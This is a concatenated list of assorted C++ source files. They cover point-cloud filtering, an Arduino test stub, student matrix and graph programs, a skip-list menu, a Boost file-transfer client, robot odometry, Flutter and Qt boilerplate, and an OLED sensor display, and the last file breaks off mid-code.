    "#include <iostream>\n#include <pcl/io/pcd_io.h>\n#include <pcl/point_types.h>\n#include <pcl/filters/voxel_grid.h>\n\nint\nmain(int argc, char** argv)\n{\n    pcl::PCLPointCloud2::Ptr cloud(new pcl::PCLPointCloud2());\n    pcl::PCLPointCloud2::Ptr cloud_filtered(new pcl::PCLPointCloud2());\n\n    // Fill in the cloud data\n    pcl::PCDReader reader;\n    // Replace the path below with the path where you saved your file\n    reader.read(\"table_scene_lms400.pcd\", *cloud); // Remember to download the file first!\n\n    std::cerr << \"PointCloud before filtering: \" << cloud->width * cloud->height\n        << \" data points (\" << pcl::getFieldsList(*cloud) << \").\" << std::endl;\n\n    // Create the filtering object\n    pcl::VoxelGrid<pcl::PCLPointCloud2> sor;\n    sor.setInputCloud(cloud);\n    //sor.setLeafSize(0.1f, 0.1f, 0.1f);\n    sor.setLeafSize(0.01f, 0.01f, 0.01f);\n    sor.filter(*cloud_filtered);\n\n    std::cerr << \"PointCloud after filtering: \" << cloud_filtered->width * cloud_filtered->height\n        << \" data points (\" << pcl::getFieldsList(*cloud_filtered) << \").\" << std::endl;\n\n    pcl::PCDWriter writer;\n    //writer.write(\"table_scene_lms400_downsampled_0.1.pcd\", *cloud_filtered,\n    //    Eigen::Vector4f::Zero(), Eigen::Quaternionf::Identity(), false);\n    writer.write(\"table_scene_lms400_downsampled_0.01.pcd\", *cloud_filtered,\n        Eigen::Vector4f::Zero(), Eigen::Quaternionf::Identity(), false);\n\n    return (0);\n}\n",
    "//\n//    FILE: unit_test_001.cpp\n//  AUTHOR: Rob Tillaart\n//    DATE: 2023-06-28\n// PURPOSE: unit tests for Smooth library\n//          https://github.com/RobTillaart/SIMON\n//\n\n\n// supported assertions\n// ----------------------------\n// assertEqual(expected, actual);               // a == b\n// assertNotEqual(unwanted, actual);            // a != b\n// assertComparativeEquivalent(expected, actual);    // abs(a - b) == 0 or (!(a > b) && !(a < b))\n// assertComparativeNotEquivalent(unwanted, actual); // abs(a - b) > 0  or ((a > b) || (a < b))\n// assertLess(upperBound, actual);              // a < b\n// assertMore(lowerBound, actual);              // a > b\n// assertLessOrEqual(upperBound, actual);       // a <= b\n// assertMoreOrEqual(lowerBound, actual);       // a >= b\n// assertTrue(actual);\n// assertFalse(actual);\n// assertNull(actual);\n\n// // special cases for floats\n// assertEqualFloat(expected, actual, epsilon);    // fabs(a - b) <= epsilon\n// assertNotEqualFloat(unwanted, actual, epsilon); // fabs(a - b) >= epsilon\n// assertInfinity(actual);                         // isinf(a)\n// assertNotInfinity(actual);                      // !isinf(a)\n// assertNAN(arg);                                 // isnan(a)\n// assertNotNAN(arg);                              // !isnan(a)\n\n\n#include <ArduinoUnitTests.h>\n\n#include \"Arduino.h\"\n#include \"SmartPin.h\"\n\n\nunittest_setup()\n{\n  fprintf(stderr, \"Arduino SmartPin library\\n\");\n}\n\n\nunittest_teardown()\n{\n}\n\n\nunittest(test_constructor)\n{\n  // assertEqual(42, sm.get_window());\n  // assertEqual(0, sm.get_count());\n  // assertEqualFloat(0, sm.get_avg(), 0.0001);\n\n  // Smooth sm0(5, 0, 0);\n  // assertEqual(5, sm0.get_window());\n  // assertEqual(0, sm0.get_count());\n  // assertEqualFloat(0, sm0.get_avg(), 0.0001);\n\n  // Smooth sm1(7, 20);\n  // assertEqual(7, sm1.get_window());\n  // assertEqual(20, sm1.get_count());\n  // assertEqualFloat(0, sm0.get_avg(), 0.0001);\n\n  // Smooth sm2(15, 25, 10);\n  // assertEqual(15, sm2.get_window());\n  // assertEqual(25, sm2.get_count());\n  // assertEqualFloat(10, sm2.get_avg(), 0.0001);\n}\n\n\nunittest_main()\n\n\n//  -- END OF FILE --\n\n",
    "#include <iostream>\n\nusing namespace std;\n\nconst int righeMax=3;\nconst int colonneMax=3;\n\n//prototipi\nvoid caricaMatrice(int matrix[righeMax][colonneMax]);\nvoid visualizzaMatrice(int matrix[righeMax][colonneMax]);\nvoid caricaVettori(int matrix[righeMax][colonneMax], int vr[righeMax*colonneMax], int vc[righeMax*colonneMax]);\nvoid visualizzaVettori(int vr[], int vc[]);\nint Menu();\n\nint main() {\n\n  int scelta;\n  int matrix[righeMax][colonneMax];\n  int VR[righeMax*colonneMax];\n  int VC[righeMax*colonneMax];\n  \n  do {\n    scelta=Menu();\n    switch(scelta) {\n      case 1:\n        caricaMatrice(matrix);\n      break;\n      case 2:\n        visualizzaMatrice(matrix);\n      break;\n      case 3:\n        caricaVettori(matrix,VR,VC);\n      break;\n      case 4:\n        visualizzaVettori(VR,VC);\n      break;\n      case 0:\n        cout<<\"Esci\"<<endl;\n      break;\n      default:\n        cout<<\"Attenzione, scelta sbagliata!\"<<endl;\n      break;\n    }\n  }while(scelta!=0);\n  \n}\n\n\nint Menu() {\n  int scegli;\n  cout<<\"-----------------MENU-----------------\"<<endl;\n  cout<<\"1-Carica matrice\"<<endl;\n  cout<<\"2-Visualizza matrice\"<<endl;\n  cout<<\"3-Carica vettori righe e colonne\"<<endl;\n  cout<<\"4-Stampa i vettori\"<<endl;\n  cout<<\"0-Fine\"<<endl;\n  cout<<\"Scegli un operazione: \"<<endl;\n  cin>>scegli;\n\n  return scegli;\n}\n\n\nvoid caricaMatrice(int matrix[righeMax][colonneMax]) {\n\n  cout<<endl;\n\n  for(int i=0; i<righeMax; i++) {\n    for(int j=0; j<colonneMax; j++) {\n      cout<<\"Inserisci il valore della cella \"<<i+1<<\" \"<<j+1<<\": \";\n      cin>>matrix[i][j];\n    }\n  }\n\n\n  cout<<endl;\n\n}\n\nvoid visualizzaMatrice(int matrix[righeMax][colonneMax]) {\n\n  cout<<endl;\n\n  for(int i=0; i<righeMax; i++) {\n    for(int j=0; j<colonneMax; j++) {\n      cout<<matrix[i][j]<<\"\\t\";\n    }\n    cout<<endl;\n  }\n\n  cout<<endl;\n\n}\n\n\nvoid caricaVettori(int matrix[righeMax][colonneMax], int vr[], int vc[]) {\n  \n  for(int i=0; i<righeMax; i++) {\n    for(int j=0; j<colonneMax; j++) {\n      vr[i*colonneMax+j]=matrix[i][j];\n    }\n  }\n\n\n  for(int i=0; i<righeMax; i++) {\n    for(int j=0; j<colonneMax; j++) {\n      vc[i*colonneMax+j]=matrix[j][i];\n    }\n  }\n\n  \n}\n\n\nvoid visualizzaVettori(int vr[], int vc[]) {\n  cout<<endl;\n\n  cout<<endl;\n\n  cout<<\"---------------VETTORE RIGHE---------------\"<<endl;\n\n  for(int i=0; i<righeMax*colonneMax; i++) {\n     cout<<vr[i]<<endl;\n  }\n\n  cout<<endl;\n\n  cout<<\"---------------VETTORE COLONNE---------------\"<<endl;\n\n  for(int i=0; i<righeMax*colonneMax; i++) {\n    cout<<vc[i]<<endl;\n  }\n  \n}\n",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <errno.h>\n#include <string.h>\n#include <sys/utsname.h>\n\n\ntypedef struct _\u0441\u0438\u0441_\u0456\u043d\u0444 {\n    char *\u043d\u0430\u0437\u0432\u0430_\u0441\u0438\u0441\u0442\u0435\u043c\u0438;\n    char *\u043d\u0430\u0437\u0432\u0430_\u0432\u0443\u0437\u043b\u0430;\n    char *\u0437\u0431\u0456\u0440\u043a\u0430_\u044f\u0434\u0440\u0430;\n    char *\u0432\u0435\u0440\u0441\u0456\u044f;\n    char *\u0430\u0440\u0445\u0456\u0442\u0435\u043a\u0442\u0443\u0440\u0430;\n} \u0421\u0438\u0441\u0442\u0435\u043c\u043d\u0430\u0406\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0456\u044f;\n\n\nextern \"C\" int \u043e\u0442\u0440\u0438\u043c\u0430\u0442\u0438_\u0441\u0438\u0441\u0442\u0435\u043c\u043d\u0443_\u0456\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0456\u044e(\u0421\u0438\u0441\u0442\u0435\u043c\u043d\u0430\u0406\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0456\u044f *\u0441\u0438\u0441_\u0456\u043d\u0444, int \u0440\u043e\u0437\u043c\u0456\u0440_\u0431\u0443\u0444\u0435\u0440\u0443) {\n    struct utsname buffer;\n\n    errno = 0;\n    if (uname(&buffer) < 0) {\n        perror(\"uname\");\n        exit(EXIT_FAILURE);\n    }\n\n    if (\u0441\u0438\u0441_\u0456\u043d\u0444 == nullptr) {\n        perror(\"\u0441\u0438\u0441_\u0456\u043d\u0444\");\n        exit(EXIT_FAILURE);\n    }\n\n    strncpy(\u0441\u0438\u0441_\u0456\u043d\u0444->\u043d\u0430\u0437\u0432\u0430_\u0441\u0438\u0441\u0442\u0435\u043c\u0438, buffer.sysname, \u0440\u043e\u0437\u043c\u0456\u0440_\u0431\u0443\u0444\u0435\u0440\u0443);\n    strncpy(\u0441\u0438\u0441_\u0456\u043d\u0444->\u043d\u0430\u0437\u0432\u0430_\u0432\u0443\u0437\u043b\u0430, buffer.nodename, \u0440\u043e\u0437\u043c\u0456\u0440_\u0431\u0443\u0444\u0435\u0440\u0443);\n    strncpy(\u0441\u0438\u0441_\u0456\u043d\u0444->\u0437\u0431\u0456\u0440\u043a\u0430_\u044f\u0434\u0440\u0430, buffer.release, \u0440\u043e\u0437\u043c\u0456\u0440_\u0431\u0443\u0444\u0435\u0440\u0443);\n    strncpy(\u0441\u0438\u0441_\u0456\u043d\u0444->\u0432\u0435\u0440\u0441\u0456\u044f, buffer.version, \u0440\u043e\u0437\u043c\u0456\u0440_\u0431\u0443\u0444\u0435\u0440\u0443);\n    strncpy(\u0441\u0438\u0441_\u0456\u043d\u0444->\u0430\u0440\u0445\u0456\u0442\u0435\u043a\u0442\u0443\u0440\u0430, buffer.machine, \u0440\u043e\u0437\u043c\u0456\u0440_\u0431\u0443\u0444\u0435\u0440\u0443);\n\n    // printf(\"system name = %s\\n\", buffer.sysname);\n    // printf(\"node name   = %s\\n\", buffer.nodename);\n    // printf(\"release     = %s\\n\", buffer.release);\n    // printf(\"version     = %s\\n\", buffer.version);\n    // printf(\"machine     = %s\\n\", buffer.machine);\n\n    return EXIT_SUCCESS;\n}\n\nextern \"C\" void \u0434\u0440\u0443\u043a_\u0441\u0456(const char* \u0444\u043e\u0440\u043c\u0430\u0442, char* \u0437\u043d\u0430\u0447\u0435\u043d\u043d\u044f = nullptr) {\n    printf(\u0444\u043e\u0440\u043c\u0430\u0442, \u0437\u043d\u0430\u0447\u0435\u043d\u043d\u044f);\n}",
    "#include<iostream>\n#include <cstdlib>\n#include\"../skip_list/skip_list.h\"\nusing namespace std;\n\n\nint main() {\n    setlocale(LC_ALL, \"rus\");\n    SkipList<int> sl(20, 0.5); \n    int choice;\n    int value;\n\n    do {\n        system(\"cls\");\n        cout << \"\u00c2\u00fb\u00e1\u00e5\u00f0\u00e8\u00f2\u00e5 \u00e4\u00e5\u00e9\u00f1\u00f2\u00e2\u00e8\u00e5:\" << endl;\n        cout << \"1. \u00c2\u00f1\u00f2\u00e0\u00e2\u00e8\u00f2\u00fc \u00fd\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\" << endl;\n        cout << \"2. \u00d3\u00e4\u00e0\u00eb\u00e8\u00f2\u00fc \u00fd\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\" << endl;\n        cout << \"3. \u00cf\u00f0\u00ee\u00e2\u00e5\u00f0\u00e8\u00f2\u00fc, \u00f1\u00ee\u00e4\u00e5\u00f0\u00e6\u00e8\u00f2\u00f1\u00ff \u00eb\u00e8 \u00fd\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\" << endl;\n        cout << \"4. \u00c2\u00fb\u00e2\u00e5\u00f1\u00f2\u00e8 \u00f1\u00ef\u00e8\u00f1\u00ee\u00ea\" << endl;\n        cout << \"0. \u00c2\u00fb\u00e9\u00f2\u00e8\" << endl;\n        cout << \"\u00c2\u00e0\u00f8 \u00e2\u00fb\u00e1\u00ee\u00f0: \";\n        cin >> choice;\n\n        switch (choice) {\n        case 1:\n            cout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00e5 \u00fd\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\u00e0 \u00e4\u00eb\u00ff \u00e2\u00f1\u00f2\u00e0\u00e2\u00ea\u00e8: \";\n            cin >> value;\n            sl.insert(value);\n            cout << \"\u00dd\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2 \u00e4\u00ee\u00e1\u00e0\u00e2\u00eb\u00e5\u00ed \u00e2 \u00f1\u00ef\u00e8\u00f1\u00ee\u00ea.\" << endl;\n            system(\"pause\");\n            break;\n        case 2:\n            cout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00e5 \u00fd\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\u00e0 \u00e4\u00eb\u00ff \u00f3\u00e4\u00e0\u00eb\u00e5\u00ed\u00e8\u00ff: \";\n            cin >> value;\n            sl.remove(value);\n            cout << \"\u00dd\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2 \u00f3\u00e4\u00e0\u00eb\u00e5\u00ed \u00e8\u00e7 \u00f1\u00ef\u00e8\u00f1\u00ea\u00e0.\" << endl;\n            system(\"pause\");\n            break;\n        case 3:\n            cout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00e5 \u00fd\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\u00e0 \u00e4\u00eb\u00ff \u00ef\u00ee\u00e8\u00f1\u00ea\u00e0: \";\n            cin >> value;\n            if (sl.search(value)) {\n                cout << \"\u00dd\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2 \u00ed\u00e0\u00e9\u00e4\u00e5\u00ed \u00e2 \u00f1\u00ef\u00e8\u00f1\u00ea\u00e5.\" << endl;\n            }\n            else {\n                cout << \"\u00dd\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2 \u00ed\u00e5 \u00ed\u00e0\u00e9\u00e4\u00e5\u00ed \u00e2 \u00f1\u00ef\u00e8\u00f1\u00ea\u00e5.\" << endl;\n            }\n            system(\"pause\");\n            break;\n        case 4:\n            cout << \"\u00d1\u00ee\u00e4\u00e5\u00f0\u00e6\u00e8\u00ec\u00ee\u00e5 \u00f1\u00ef\u00e8\u00f1\u00ea\u00e0:\" << endl;\n            sl.printList();\n            system(\"pause\");\n            break;\n        case 0:\n            cout << \"\u00c2\u00fb\u00f5\u00ee\u00e4.\" << endl;\n            break;\n        default:\n            cout << \"\u00cd\u00e5\u00e2\u00e5\u00f0\u00ed\u00fb\u00e9 \u00e2\u00e2\u00ee\u00e4. \u00cf\u00ee\u00ef\u00f0\u00ee\u00e1\u00f3\u00e9\u00f2\u00e5 \u00e5\u00f9\u00e5 \u00f0\u00e0\u00e7.\" << endl;\n            system(\"pause\");\n        }\n\n    } while (choice != 0);\n\n    return 0;\n}",
    "\ufeff#include \"iostream\"\n#include \"fstream\"\nusing namespace std;\n\nconst int MAX = 20;\n\nstruct maTrix {\n\tint maTranKe[MAX][MAX];\n\tint soDinh;\n};\n\nvoid readFile(maTrix& mtk) {\n\tifstream inFile(\"Text.txt\");\n\tif (!inFile.is_open()) {\n\t\tcout << \"\\nKhong the mo tep\";\n\t\treturn;\n\t}\n\n\tinFile >> mtk.soDinh;\n\tfor (int i = 0; i < mtk.soDinh; i++) {\n\t\tfor (int j = 0; j < mtk.soDinh; j++) {\n\t\t\tinFile >> mtk.maTranKe[i][j];\n\t\t}\n\t}\n\tinFile.close();\n}\n\nvoid outputMaTrix(maTrix mtk) {\n\tcout << \"\\nMA TRAN KE: \" << endl;\n\tfor (int i = 0; i < mtk.soDinh; i++) {\n\t\tfor (int j = 0; j < mtk.soDinh; j++) {\n\t\t\tcout << mtk.maTranKe[i][j] << \"\\t\";\n\t\t}\n\t\tcout << endl;\n\t}\n}\n\n//  H\u00e0m tr\u1ea3 v\u1ec1 s\u1ed1 c\u1ea1nh c\u1ee7a \u0111\u1ed3 th\u1ecb\nint soCanhDoThi(maTrix mtk) {\n\tint tongSoCanh = 0;\n\tfor (int i = 0; i < mtk.soDinh; i++) {\n\t\tfor (int j = 0; j < mtk.soDinh; j++) {\n\t\t\tif (mtk.maTranKe[i][j] != 0)\n\t\t\t\ttongSoCanh++;\n\t\t}\n\t}\n\treturn tongSoCanh;\n}\n\n// T\u00ednh b\u1eadc ra c\u1ee7a \u0111\u1ed3 th\u1ecb \nint outDeg(maTrix mtk, int dinhU) {\n\tint soBacRa = 0;\n\tfor (int i = 0; i < mtk.soDinh; i++) {\n\t\tif (mtk.maTranKe[dinhU][i] != 0)\n\t\t\tsoBacRa++;\n\t}\n\treturn soBacRa;\n}\n\n// Cho \u0111\u1ec9nh u, t\u00ecm \u0111\u1ec9nh v sao cho c\u1ea1nh (u,v) c\u00f3 tr\u1ecdng s\u1ed1 l\u1edbn nh\u1ea5t \nbool canhLonNhat(maTrix mtk, int dinhU, int& dinhV) {\n\tfor (int i = 0; i < mtk.soDinh; i++) {\n\t\tif (mtk.maTranKe[dinhU][i] > mtk.maTranKe[dinhU][dinhV])\n\t\t\tdinhV = i;\n\t}\n\treturn true;\n}\n\nint main() {\n\tmaTrix mtk;\n\treadFile(mtk);\n\toutputMaTrix(mtk);\n\n\treturn 0;\n}",
    "#include \"globals.h\"\n#include \"client.h\"\n\nstring sendFileWithCommand(tcp::socket& socket, const string& user, const string &file, const string& command) {\n    boost::filesystem::path p(dirClient + \"/\" + file);\n    ifstream source_file(dirClient + \"/\" + file, ios_base::binary | ios_base::ate);\n    if (!source_file)\n    {\n        std::cout << \"failed to open \" << file << std::endl;\n        return \"ERROR\";\n    }\n\n    // get length of file\n    source_file.seekg(0, source_file.end);\n    auto file_size = source_file.tellg();\n    source_file.seekg(0, source_file.beg);\n\n    enum { MessageSize = 1024 };\n    array<char, MessageSize> buf{};\n\n    // first send file name and file size to server\n    boost::asio::streambuf request;\n    std::ostream request_stream(&request);\n    request_stream << command << \" \" << user << \" \" << p.filename().string() << \" \" << file_size << \"\\n\\n\";\n    boost::asio::write(socket, request);\n\n    // then send file\n    std::cout << \"start sending file content.\\n\";\n\n\n    while (source_file) {\n        source_file.read(buf.data(), buf.size());\n        if (source_file.fail() && !source_file.eof()) {\n            auto msg = \"Failed while reading file\";\n            std::cout << msg;\n            throw std::fstream::failure(msg);\n        }\n\n        auto m_buf = boost::asio::buffer(buf.data(), static_cast<size_t>(source_file.gcount()));\n        boost::system::error_code error3;\n        boost::asio::write(socket, m_buf, error3);\n\n        cout << \"send byte\" << endl;\n    }\n\n    source_file.close();\n\n    cout << \"file stream sent\" << endl;\n\n    if (command == \"zip\" || command == \"unzip\") {\n        boost::asio::streambuf response;\n        boost::system::error_code error2;\n        boost::asio::read(socket, response, boost::asio::transfer_all(), error2);\n        std::istream ss(&response);\n        std::string ok;\n        std::string name;\n        ss >> ok; ss >> name;\n        std::cout << \"message: \" << ok << \" \" << name << std::endl;\n        if (ok == \"Error\") {\n            return ok;\n        }\n\n        return name;\n    }\n\n    if (command == \"zip-and-get\") {\n        return file + \".sev\";\n    } else if (command == \"unzip-and-get\") {\n        size_t lastOf = file.find_last_of(\".\");\n        string path = file.substr(0, lastOf);\n        return path;\n    }\n}\n\nbool getFileWithCommand(tcp::socket& socket, const string& user, const string &file) {\n    std::array<char, 1024> buf{};\n    boost::asio::streambuf request_buf;\n    boost::system::error_code ignore_error_read_until;\n    boost::asio::read_until(socket, request_buf, \"\\n\\n\", ignore_error_read_until);\n    std::cout<< \"request size:\" << request_buf.size() << \"\\n\";\n\n    istream requestStream(&request_buf);\n    string responseStatus;\n    string file_path;\n    size_t file_size = 0;\n\n    requestStream >> responseStatus;\n    requestStream >> file_path;\n    requestStream >> file_size;\n\n\n\n    requestStream.read(buf.data(), 2); // eat the \"\\n\\n\"\n\n    cout << file_path << \" size is \" << file_size << endl;\n\n    size_t pos = file_path.find_last_of('\\\\');\n    if (pos!=std::string::npos)\n        file_path = file_path.substr(pos+1);\n\n    file_path = dirClient + \"/\" + file_path;\n\n    std::ofstream outputFile(file_path, std::ios_base::binary);\n    if (!outputFile)\n    {\n        std::cout << \"failed to open \" << file_path << std::endl;\n        return __LINE__;\n    }\n\n    // write extra bytes to file\n    do\n    {\n        requestStream.read(buf.data(), (std::streamsize) buf.size());\n        std::cout << __FUNCTION__ << \" write \" << requestStream.gcount() << \" bytes.\\n\";\n        outputFile.write(buf.data(), requestStream.gcount());\n    } while (requestStream.gcount() > 0);\n\n    if (outputFile.tellp() >= static_cast<std::streamsize>(file_size)) {\n        outputFile.close();\n        return true;\n    }\n\n\n    while (true) {\n        boost::system::error_code ignore_error;\n        size_t bytes = socket.read_some(boost::asio::buffer(buf.data(), buf.size()), ignore_error);\n        if (!ignore_error) {\n            if (bytes > 0) {\n                outputFile.write(buf.data(), static_cast<std::streamsize>(bytes));\n                if (outputFile.tellp() >= static_cast<std::streamsize>(file_size)) {\n                    outputFile.close();\n                    break;\n                }\n            }\n        } else {\n            cout << \"error while loop\" << endl;\n            return false;\n        }\n\n    }\n\n    return true;\n}\n\nstring zip(const string& user, const string &file) {\n    boost::asio::io_context ioContext;\n    tcp::resolver resolver(ioContext);\n    tcp::resolver::query query(hostIp, port);\n    tcp::resolver::iterator endpoint_iterator = resolver.resolve(query);\n    tcp::resolver::iterator end;\n    tcp::socket socket(ioContext);\n    boost::system::error_code error = boost::asio::error::host_not_found;\n    boost::asio::connect(socket, endpoint_iterator, error);\n\n    if (error) {\n        cout << \"failed to connect\" << endl;\n        return __TIME__;\n    }\n\n    cout << \"connected to \" << hostIp ",
    "#include \"main.h\"\r\n\r\nBot::Bot(){\r\n    int RDeg;\r\n    int LDeg;\r\n    double LTar;\r\n    double RTar;\r\n    double Dis;\r\n    double LDis;\r\n    double RDis;\r\n    double error;\r\n    double Heading;\r\n    bool PurePursuit;\r\n}\r\ndouble DegToRad(double x) {\r\n    return (x * (M_PI/180));\r\n}\r\ndouble RadToDeg(double x) {\r\n    return (x* (180/M_PI));\r\n}\r\n\r\nvoid Odometry(){\r\n    double DeltaLeft;\r\n    double DeltaRight;\r\n    double LastL;\r\n    double LastR;\r\n    double LastHeading;\r\n\r\n    while (1){\r\n        bot.RDeg = 1;//replace with Motor degrees\r\n        bot.LDeg = 1;\r\n\r\n        DeltaLeft = (bot.LDeg - LastL);\r\n        DeltaRight = (bot.RDeg - LastR);\r\n\r\n        bot.LDis = DegToRad(DeltaLeft) * radius;\r\n        bot.RDis = DegToRad(DeltaRight) * radius;\r\n\r\n        bot.Dis = (bot.LDis + bot.RDis)/2.0;\r\n        bot.Heading = (bot.Heading - LastHeading);\r\n\r\n        bot.x += bot.Dis * cos(bot.Heading);\r\n        bot.y += bot.Dis * sin(bot.Heading);\r\n        bot.Heading += (bot.LDis - bot.RDis)/ TrackLength;\r\n\r\n        LastL = bot.LDeg;\r\n        LastR = bot.RDeg;\r\n\r\n        LastHeading = bot.Heading;\r\n    }\r\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"app_yesno_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"SendWindow.h\"\r\n#include <QPainter>\r\n#include <QDebug>\r\n#include <QColorDialog>\r\n\r\nSendWindow::SendWindow(QWidget *parent) : QMainWindow(parent), drawing(false) {\r\n    setWindowTitle(\"Send Window\");\r\n    image = QImage(size(), QImage::Format_ARGB32_Premultiplied);\r\n    image.fill(Qt::white);\r\n    //paintColor = Qt::black;\r\n\r\n    clearButton = new QPushButton(\"Clear\", this);\r\n    clearButton->move(10, 10);\r\n    connect(clearButton, &QPushButton::clicked, this, &SendWindow::clearDrawing);\r\n}\r\n\r\nvoid SendWindow::drawLine(const QPoint& startPos, const QPoint& endPos, const QColor& color) {\r\n    QPainter painter(&image);\r\n    painter.setPen(QPen(color, 2));\r\n    painter.drawLine(startPos, endPos);\r\n    update();\r\n}\r\n\r\nvoid SendWindow::serializeImage(){\r\n    QByteArray imageData;\r\n    QDataStream stream(&imageData, QIODevice::WriteOnly);\r\n    stream << this->image;\r\n    emit imageSent(imageData);\r\n}\r\n\r\nvoid SendWindow::mousePressEvent(QMouseEvent *event) {\r\n    if (event->button() == Qt::LeftButton) { //left click to draw\r\n        drawing = true;\r\n        lastPos = event->pos();\r\n        startPos = lastPos; // Update the start position of the line\r\n    }\r\n}\r\n\r\nvoid SendWindow::mouseMoveEvent(QMouseEvent *event) {\r\n    if ((event->buttons() & Qt::LeftButton) && drawing) {\r\n        //draw the last position of the line as the mouse moving\r\n        drawLine(lastPos, event->pos(), Qt::blue);\r\n        lastPos = event->pos();\r\n        //data serialization\r\n        serializeImage();\r\n    }\r\n}\r\n\r\nvoid SendWindow::mouseReleaseEvent(QMouseEvent *event) {\r\n    if (event->button() == Qt::LeftButton && drawing) { //release left click to stop drawing\r\n        drawing = false;\r\n    }\r\n}\r\n\r\nvoid SendWindow::paintEvent(QPaintEvent *event) {\r\n    QMainWindow::paintEvent(event);\r\n    QPainter painter(this);\r\n    painter.drawImage(0, 0, image);\r\n}\r\n\r\nvoid SendWindow::clearDrawing() {\r\n    image.fill(Qt::white);\r\n    update();\r\n    emit clearSignal(); // Emit the clearSignal when drawing is cleared\r\n}\r\n",
    "/**\n * @file screen.cpp\n * @brief OLED Screen Management\n * @date 2024-04-05\n * @author Izukend\n */\n\n#include \"../../include/screen.h\" // Including necessary libraries\n\nSSD1306Wire display(0x3c, SDA, SCL); // Creating an instance of the OLED screen with address 0x3c\n\n/**\n * @brief Function to initialize the OLED screen\n * \n * This function initializes the OLED screen by configuring the display with centered text\n * indicating the IP address to enter in the web browser.\n */\nvoid oledInit(){\n    // Initialize the OLED screen\n    display.init();\n    display.setTextAlignment(TEXT_ALIGN_CENTER); // Text alignment set to center\n    display.setFont(ArialMT_Plain_10); // Using ArialMT font with size 10\n\n    // Display text on the OLED screen\n    display.drawString(64, 16, \"Enter on web browser:\");\n    display.drawString(64, 48, \"192.168.4.1\");\n    display.display(); // Update the display\n}\n\n/**\n * @brief Function to clear the OLED screen\n * \n * This function clears the current content of the OLED screen.\n */\nvoid oledErase(){\n    display.clear(); // Clear the OLED screen\n    display.display(); // Update the display to apply the changes\n}\n\n/**\n * @brief Display CO2 data on the OLED screen.\n * \n * This function initializes serial communication with the MH-Z19 sensor, retrieves the CO2 data\n * from the sensor, converts it to a string, and displays it on the OLED screen.\n */\nvoid oledPrintData() {\n    // Initialize serial communication with the MH-Z19 sensor\n    mySerial.begin(9600);\n    // Initialize the MH-Z19 sensor\n    myMHZ19.begin(mySerial);\n\n    // Wait for 3 seconds to allow the sensor to initialize\n    